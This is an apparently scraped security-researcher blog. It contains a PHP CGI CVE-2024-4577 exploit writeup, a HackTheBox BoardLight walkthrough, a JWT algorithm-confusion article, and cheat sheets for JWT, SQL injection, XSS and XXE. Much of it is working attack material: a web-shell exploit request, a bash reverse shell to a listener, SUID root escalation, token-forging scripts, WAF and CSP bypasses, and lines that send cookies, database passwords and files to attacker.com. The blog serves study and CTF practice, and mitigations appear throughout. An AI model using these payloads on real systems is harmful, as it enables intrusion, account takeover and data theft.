Todos Research CVE Writeup Research "JWT Algorithm Confusion Attacks" 2026-03-06  ·  Tags: jwt · auth · cryptography · web How RS256 to HS256 algorithm confusion works, why it's still found in the wild, and how to test for it. Initial access via Dolibarr ERP CVE, privesc via vulnerable SUID enlightenment_sys binary. docs.title: About
docs.text:
Hi, I'm Hans_Moleman.PNG — security researcher focused on AppSec and vulnerability research.

I spend most of my time looking for bugs in web applications, hunting CVEs, and doing CTFs when I should be sleeping.

Areas I work in:

  • Web application security
  • Penetration testing
  • Vulnerability research & disclosure
  • CTF (HackTheBox, HTB Pro Labs)

docs.title: CVE-2024-4577: PHP CGI Argument Injection on Windows
CVE-2024-4577: PHP CGI Argument Injection on Windows
Overview
docs.text:
CVE-2024-4577 is a critical vulnerability (CVSS 9.8) in PHP that affects Windows systems running PHP in CGI mode. It was disclosed in June 2024 and affects PHP versions 8.1 < 8.1.29, 8.2 < 8.2.20, and 8.3 < 8.3.8.

The vulnerability is a bypass of the fix for CVE-2012-1823, a well-known PHP CGI argument injection from 2012. Due to the way Windows handles character encoding with the "Best-Fit" feature, an attacker can inject arguments directly into the PHP binary, achieving unauthenticated remote code execution.

Field Value CVE CVE-2024-4577 CVSS 9.8 Critical Affected PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 Attack vector Network (unauthenticated) Patch PHP 8.1.29 / 8.2.20 / 8.3.8

docs.title: Root Cause
docs.text:
The original CVE-2012-1823 was patched by blocking query strings that start with - characters (which would be interpreted as CLI arguments by the PHP binary). However, this fix relied on exact character matching.

On Windows, when using code pages like 932 (Japanese Shift-JIS), certain multi-byte characters include 0xAD as a trailing byte — which Windows "Best-Fit" mapping silently normalizes to 0x2D (the - character). This normalization happens after the security check, allowing the restriction to be bypassed.

Attacker sends: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
Windows normalizes: /?-d+allow_url_include=1+-d+auto_prepend_file=php://input
PHP CGI processes: php.exe -d allow_url_include=1 -d auto_prepend_file=php://input

docs.title: Exploitation
docs.text:
The attack is straightforward. The attacker sends a crafted GET request to a PHP CGI endpoint, injecting -d arguments to enable allow_url_include and set auto_prepend_file to php://input. The POST body contains the PHP payload.

POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>

Execution then via:

GET /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input&cmd=whoami HTTP/1.1

Several XAMPP configurations on Windows are vulnerable by default — XAMPP sets PHP to run in CGI mode and serves it on localhost, but many deployments expose it externally or on internal networks accessible to attackers.

docs.title: Impact
docs.text:
• Unauthenticated RCE on any PHP CGI deployment on Windows
  • XAMPP default installations are vulnerable out of the box
  • Multiple threat actors and ransomware groups exploited this within days of disclosure
  • CISA added it to the Known Exploited Vulnerabilities catalog

docs.title: Detection
docs.text:
Look for HTTP requests containing encoded dashes (%AD, %2D) in the query string followed by PHP ini directives:

%ADd, %2Dd, -%64 (all decode to -d)
allow_url_include, auto_prepend_file, auto_append_file

Web server logs with requests like /?%ADd+allow_url_include are a strong indicator of exploitation attempts.

docs.title: Mitigation
docs.text:
1. Update PHP to 8.1.29, 8.2.20, or 8.3.8
  2. Avoid CGI mode — use PHP-FPM or mod_php instead
  3. For XAMPP, apply the vendor-provided patch or restrict external access

docs.title: References
docs.text:
• PHP Security Advisory
  • Original researcher writeup by DEVCORE
  • NVD entry

docs.title: HTB BoardLight — Writeup
docs.text: Writeup2026-03-06

docs.title: HTB BoardLight — Writeup
docs.text: Difficulty: Easy OS: Linux Release: 2024-05-11

docs.title: Recon
docs.text:
Start with a port scan:

nmap -sC -sV -oN nmap/initial 10.10.11.11

22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41

The web server at port 80 shows a corporate landing page for "BoardLight". Nothing interesting in the visible content, but subdomain enumeration finds something:

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://board.htb/ -H "Host: FUZZ.board.htb" -fs 15949

crm     [Status: 200, Size: 6360]

docs.title: Initial Access — Dolibarr ERP (CVE-2023-30253)
docs.text:
The subdomain crm.board.htb runs Dolibarr ERP 17.0.0. Default credentials work:

admin:admin

Dolibarr 17.0.0 is vulnerable to CVE-2023-30253, a PHP code injection via the website module. The CMS page editor allows creating .php files but tries to block <?php tags. The bypass is trivial — use <?PHP (uppercase):

<?PHP system($_GET['cmd']); ?>

Create a new website, add a page, inject the payload in the page template, then request it:

http://crm.board.htb/htdocs/public/website/index.php?website=test&pageref=shell&cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Upgrade to a reverse shell:

# Listener
nc -lvnp 4444

# Payload (URL encoded)
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'

docs.title: Lateral Movement — User
docs.text:
Enumerate the Dolibarr config:

cat /var/www/html/crm.board.htb/htdocs/conf/conf.php

$dolibarr_main_db_pass='ServicesHubADM!';

Try the password for the local users:

cat /etc/passwd | grep -v nologin | grep -v false
# larissa:x:1000:1000::/home/larissa:/bin/bash

su - larissa   # password: ServicesHubADM!

Grab user.txt.

docs.title: Privilege Escalation — enlightenment_sys SUID
docs.text:
Look for SUID binaries:

find / -perm -4000 -type f 2>/dev/null

/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys

The installed version of the enlightenment window manager is vulnerable to a local privilege escalation via enlightenment_sys. The binary takes a path argument and passes it to mount as root without proper sanitization.

/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
  /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
  "/dev/../tmp/;/tmp/exploit"

Where /tmp/exploit is:

#!/bin/bash
chmod +s /bin/bash

After execution:

/bin/bash -p
# bash-5.0# id
# uid=1000(larissa) gid=1000(larissa) euid=0(root) egid=0(root)

Grab root.txt.

docs.title: Summary
docs.text: Step Technique Recon Subdomain enumeration → crm.board.htb Initial access Dolibarr default creds + CVE-2023-30253 PHP injection Lateral movement Password reuse from Dolibarr config Privesc Vulnerable SUID enlightenment_sys binary

docs.title: JWT Algorithm Confusion Attacks
docs.text: Research2026-03-06

docs.title: JWT Algorithm Confusion Attacks
docs.text: Algorithm confusion (also called key confusion) is one of the most dangerous JWT vulnerabilities. When exploitable, it typically gives you the ability to forge arbitrary tokens and impersonate any user, including admins. Despite being well-documented since 2015, it still shows up regularly.

docs.title: Background: RS256 vs HS256
docs.text:
JWTs can be signed with different algorithms:

  • HS256 — HMAC-SHA256, symmetric. The same secret key is used to sign and verify.
  • RS256 — RSA-SHA256, asymmetric. A private key signs; the public key verifies.

The algorithm is specified in the token header:

{
  "alg": "RS256",
  "typ": "JWT"
}

docs.title: The Vulnerability
docs.text:
The attack works when:

  1. The server signs tokens with RS256 (private key)
  2. The server's JWT library accepts both RS256 and HS256
  3. The library uses the public key as-is when HS256 is specified

If an attacker changes alg from RS256 to HS256, some libraries will verify the signature using the public key as the HMAC secret. Since the public key is, well, public — the attacker can sign arbitrary tokens.

Server expects RS256:   verify(token, publicKey)
Attacker sends HS256:   verify(token, publicKey)  ← same call, different interpretation

The root cause is usually a verification function like:

# Vulnerable
jwt.decode(token, public_key)  # trusts the header's alg field

# Safe
jwt.decode(token, public_key, algorithms=["RS256"])  # explicitly restrict algorithms

docs.title: Finding the Public Key
docs.text:
To forge a token you need the server's RSA public key. Common sources:

  1. JWKS endpoint — /.well-known/jwks.json, /api/auth/jwks
  2. Embedded in responses — some apps return it in auth flows
  3. Derivation from two tokens — using rsa_sign2n or similar tools, you can derive the public key from two RS256-signed tokens
# Derive public key from two tokens
git clone https://github.com/silentsignal/rsa_sign2n
python3 rsa_sign2n/standalone/jwt_forgery.py token1 token2

docs.title: Exploitation
docs.text:
Once you have the public key, forge a token with an elevated role:

import jwt

public_key = open("public.pem").read()

payload = {
    "sub": "1337",
    "username": "admin",
    "role": "administrator",
    "iat": 1700000000,
    "exp": 9999999999
}

forged = jwt.encode(payload, public_key, algorithm="HS256")
print(forged)

Use the forged token in the Authorization: Bearer header and observe the response.

docs.title: Testing Checklist
docs.text:
When assessing a JWT implementation:

  • [ ] Check the alg header — is it RS256/ES256 or symmetric?
  • [ ] Try changing alg to HS256 and re-signing with the public key
  • [ ] Try alg: none (no signature required)
  • [ ] Look for a JWKS endpoint and retrieve the public key
  • [ ] Test if the kid header allows path traversal or SQL injection
  • [ ] Check token expiry is enforced (exp claim)
  • [ ] Verify the aud (audience) claim is validated

docs.title: Mitigation
docs.text:
For developers:

  • Always explicitly specify allowed algorithms when verifying: 
    jwt.decode(token, key, algorithms=["RS256"])
  • Use a well-maintained JWT library and keep it updated
  • Reject tokens with alg: none
  • Pin the expected algorithm in config, not at runtime

Detection: - Log JWT verification failures including the algorithm claimed - Alert on alg: none or unexpected algorithm changes from the same client

docs.title: Tools
docs.text: Tool Use jwt.io Decode and inspect JWTs jwt_tool Automated JWT attack testing rsa_sign2n Derive public key from token pairs Burp Suite JWT Editor In-proxy token manipulation

docs.title: References
docs.text:
• PortSwigger Web Security Academy — JWT attacks
  • RFC 7518 — JSON Web Algorithms
  • Auth0 — Critical vulnerabilities in JWT libraries (2015)

docs.title: XXE Injection Deep Dive
docs.text: Writeup2026-03-05

docs.title: Overview
docs.text: XML External Entity (XXE) is a vulnerability that occurs when XML parsers process external entities without proper restrictions.

docs.title: Impact
docs.text:
• Local file disclosure
  • SSRF
  • Denial of Service

docs.title: Example payload
docs.text:
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

docs.title: Knowledge Base
docs.text:
Reference material, cheat sheets, and attack techniques organized by category.

🔐 Cryptography 1 sheet  ·  ● 1 writeup ⚡ Web Security 3 sheets  ·  ● 2 writeups

docs.title: Cryptography
docs.text:
Cryptographic attacks, weak implementations, token forgery, and encoding tricks.

JSON Web Tokens (JWT) JWT structure, common attack vectors — none alg, algorithm confusion, weak secrets, kid injection. Related posts
  • Research 2026-03-06 "JWT Algorithm Confusion Attacks"

docs.title: Structure
docs.text:
header.payload.signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Each part is Base64URL encoded (no padding, - instead of +, _ instead of /).

docs.title: Attack 1 — alg: none
docs.text:
Strip the signature entirely:

import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).rstrip(b'=')
token   = header.decode() + '.' + payload.decode() + '.'

Accepted by libraries that don't explicitly disallow none.

docs.title: Attack 2 — Algorithm confusion (RS256 → HS256)
docs.text:
If the server uses RS256 and the public key is known, re-sign as HS256 using the public key as the HMAC secret.

import jwt

public_key = open('public.pem').read()
forged = jwt.encode({"sub":"1","role":"admin"}, public_key, algorithm="HS256")

Works when the library trusts the alg header without restriction.

docs.title: Attack 3 — Weak secret (brute force)
docs.text:
# hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d rockyou.txt

Common weak secrets: secret, password, 123456, app name, empty string.

docs.title: Attack 4 — kid header injection
docs.text:
The kid (key ID) field is used to look up the signing key. If it's passed to a filesystem lookup or SQL query:

{ "alg": "HS256", "kid": "../../dev/null" }

An empty file read → secret is empty string → sign with "".

{ "alg": "HS256", "kid": "' UNION SELECT 'attacker_secret' --" }

SQL injection → control the signing key.

docs.title: Attack 5 — jwks_uri spoofing
docs.text:
If the server fetches the public key from a URL in the token header (jku, x5u):

{ "alg": "RS256", "jku": "https://attacker.com/jwks.json" }

Host your own JWKS with a key pair you control.

docs.title: Quick decode
docs.text:
# Decode without verification (inspect only)
python3 -c "
import sys, base64, json
t = sys.argv[1].split('.')
for p in t[:2]:
    p += '=='
    try: print(json.loads(base64.urlsafe_b64decode(p)))
    except: pass
" <token>

docs.title: Mitigations
docs.text: Risk Fix alg: none Explicitly whitelist allowed algorithms Alg confusion Pin algorithm: jwt.decode(t, key, algorithms=["RS256"]) Weak secret Use 256-bit random secret for HS256 kid injection Validate and sanitize kid; don't use in DB queries jku/x5u spoofing Pin or whitelist JWKS URLs

docs.title: Web Security
docs.text:
Client-side attacks, injection flaws, authentication bypasses, and server-side vulnerabilities.

SQL Injection Union-based, blind, time-based and OOB SQLi — detection, exploitation, and automation with sqlmap. Cross-Site Scripting (XSS) Reflected, stored and DOM-based XSS — payloads, bypasses, and CSP evasion. XML External Entity (XXE) XXE attack patterns — basic, blind OOB exfil, error-based, and SVG/XLSX vectors. Related posts
  • Research 2026-03-06 "JWT Algorithm Confusion Attacks"
  • Writeup 2026-03-05 XXE Injection Deep Dive

docs.title: Detection
docs.text:
-- Single quote error test
'
''
`
-- Boolean tests
' AND 1=1 --
' AND 1=2 --
-- Time-based
'; WAITFOR DELAY '0:0:5' --   (MSSQL)
' AND SLEEP(5) --              (MySQL)
' AND 1=(SELECT 1 FROM pg_sleep(5)) --  (PostgreSQL)

docs.title: Error-based / Union
docs.text:
-- Find column count
' ORDER BY 1 --
' ORDER BY 2 --
...until error

-- Union injection
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, user(), database() --

-- Extract tables (MySQL)
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --

-- Extract columns
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --

-- Dump data
' UNION SELECT username,password,3 FROM users --

docs.title: Blind (Boolean-based)
docs.text:
-- Determine DB version length
' AND LENGTH(version())=8 --

-- Extract char by char
' AND SUBSTR(version(),1,1)='8' --
' AND ASCII(SUBSTR(password,1,1))>100 --

docs.title: Time-based blind
docs.text:
-- MySQL
' AND IF(1=1, SLEEP(5), 0) --
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- MSSQL
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5' --

docs.title: Out-of-band (OOB)
docs.text:
-- MySQL: DNS exfil via LOAD_FILE (requires file_priv)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))

-- MSSQL: DNS via linked server
EXEC master..xp_dirtree '\\attacker.com\share'

docs.title: sqlmap quick reference
docs.text:
# Basic detection
sqlmap -u "http://target/page?id=1" --batch

# Full dump
sqlmap -u "http://target/page?id=1" --batch --dump-all

# With cookies (authenticated)
sqlmap -u "http://target/page?id=1" --cookie "session=abc123" --batch

# POST request
sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch

# Level and risk (higher = more aggressive)
sqlmap -u "..." --level=5 --risk=3

# Second-order SQLi
sqlmap -u "http://target/profile" --second-url "http://target/display" --batch

docs.title: WAF bypass techniques
docs.text: Technique Example Case variation SeLeCt, uNiOn Comments SE/**/LECT, UN--\nION URL encoding %55NION (U→%55) Double encoding %2555NION Whitespace alternatives SELECT%09, SELECT%0a Inline comment /*!UNION*/ (MySQL)

docs.title: Types
docs.text: Type Sink Persistence Reflected Server response None Stored Database / file Permanent DOM-based Client-side JS None

docs.title: Payload starters
docs.text:
<!-- Basic alert -->
<script>alert(1)</script>

<!-- Event handler (when tags are filtered) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=alert(1)>

<!-- String context -->
';alert(1)//
"-alert(1)-"

<!-- Template literal -->
${alert(1)}

<!-- HTML entity bypass -->
<script>alert(1)</script>  ← won't work
<script>alert(1)</script>             ← actual bypass if entity decoding happens before sink

docs.title: CSP bypass techniques
docs.text:
default-src 'self'
  • script-src 'unsafe-inline' — inline scripts allowed
  • script-src 'nonce-xxx' — if nonce is reused or predictable
  • script-src cdn.example.com — find JSONP/Angular on whitelisted domains
  • script-src 'strict-dynamic' — inject trusted script that loads your payload
<!-- JSONP bypass (if jsonp endpoint on allowed domain) -->
<script src="https://allowed.com/jsonp?callback=alert(1)//"></script>

<!-- Angular (if Angular loaded from allowed domain) -->
{{constructor.constructor('alert(1)')()}}

docs.title: DOM sinks to watch
docs.text:
document.write()
innerHTML / outerHTML
eval() / setTimeout() / setInterval() with string arg
location.href
element.src / element.action
jQuery: $(), .html(), .after()

docs.title: Steal cookies / session
docs.text:
// Via fetch to attacker server
fetch('https://attacker.com/?c=' + document.cookie)

// Via img
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie)

// XSS + CSRF combo: change email
fetch('/api/user', {method:'POST', body:'email=attacker@evil.com', credentials:'include'})

docs.title: Filter bypass cheatsheet
docs.text: Block Bypass <script> filtered <ScRiPt>, <script/src=...> Quotes filtered Use String.fromCharCode or backticks alert filtered confirm(1), prompt(1), console.log Spaces filtered <img/src=x/onerror=alert(1)> javascript: filtered jAvAsCrIpT:, javascript:

docs.title: Basic file read
docs.text:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

docs.title: SSRF via XXE
docs.text:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>

docs.title: Blind XXE — OOB via DTD
docs.text:
When the response doesn't reflect the entity, use an out-of-band channel.

External DTD (hosted on attacker server at http://attacker.com/evil.dtd):

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY % send SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
%send;

Payload in the request:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>x</foo>

docs.title: Error-based XXE
docs.text:
If the app reflects XML parsing errors:

<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY % err SYSTEM 'file:///nonexistent/%file;'>">
  %wrap;
  %err;
]>

The file content appears in the error message.

docs.title: PHP filter — base64 encode to bypass newline issues
docs.text: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

docs.title: Common attack vectors
Mitigation
docs.text:
• Disable external entities in the XML parser (default in most modern parsers if configured)
  • Use defusedxml in Python, FEATURE_DISALLOW_DOCTYPE_DECL in Java
  • Input validation on file uploads (check magic bytes, not just extension)
